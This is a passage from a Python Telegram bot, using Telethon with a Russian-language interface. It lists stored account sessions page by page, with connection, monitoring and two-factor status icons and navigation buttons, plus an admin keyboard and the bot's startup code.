        text = f"📱 *Выберите аккаунт* (стр. {page+1}/{total_pages})\n\n"

        buttons = []
        for session in page_sessions:
            # Проверяем статус подключения
            is_connected = False
            if session['phone'] in self.session_manager.clients:
                try:
                    is_connected = self.session_manager.clients[session['phone']].is_connected()
                except:
                    is_connected = False

            status = "✅" if is_connected else "⚠️"
            monitoring = "👁️" if session.get('monitoring_active') else ""
            twofa = "🔐" if session['two_fa'] else ""
            buttons.append([Button.inline(
                f"{status} {session['phone']} {monitoring} {twofa}",
                data=f"select_session_{session['id']}"
            )])

        nav_buttons = []
        if page > 0:
            nav_buttons.append(Button.inline("⬅️", data=f"user_page_{page-1}"))

        nav_buttons.append(Button.inline(f"📄 {page+1}/{total_pages}", data="info"))

        if page < total_pages - 1:
            nav_buttons.append(Button.inline("➡️", data=f"user_page_{page+1}"))

        buttons.append(nav_buttons)
        buttons.append([Button.inline("🔄 Обновить", data="refresh_user")])

        if isinstance(event, events.CallbackQuery.Event):
            await event.edit(text, buttons=buttons, parse_mode='md')
        else:
            await event.respond(text, buttons=buttons, parse_mode='md')

    def get_admin_keyboard(self):
        return [
            [Button.text("📱 Добавить сессию")],
            [Button.text("📋 Список сессий")],
            [Button.text("📊 Статистика")]
        ]

async def main():
    bot = SessionBot()
    await bot.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nБот остановлен")
